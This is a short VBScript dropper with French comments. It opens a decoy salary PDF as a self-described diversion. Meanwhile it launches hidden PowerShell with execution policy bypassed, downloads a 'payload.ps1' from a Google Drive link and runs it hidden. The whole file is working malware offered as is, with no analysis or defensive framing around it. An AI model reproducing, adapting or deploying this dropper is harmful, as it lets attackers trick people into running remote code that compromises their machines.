Set WshShell = CreateObject("WScript.Shell")

' Ouvre le PDF (diversion)
WshShell.Run """C:\Users\User\Desktop\img_waf\leurre\salaire.pdf""", 1, False

' Exécute PowerShell en caché pour télécharger et lancer le PS1 dans le dossier courant
WshShell.Run "powershell -WindowStyle Hidden -ExecutionPolicy Bypass -Command ""$dossier = 'C:\Users\User\Desktop\img_waf\leurre'; $fichier = Join-Path $dossier 'payload.ps1'; Invoke-WebRequest -Uri 'https://drive.google.com/uc?export=download&id=1b-ODwvZQgzQpOBatqnPFe8WzWbNssabg' -OutFile $fichier; powershell -ExecutionPolicy Bypass -WindowStyle Hidden -File $fichier""", 0, False
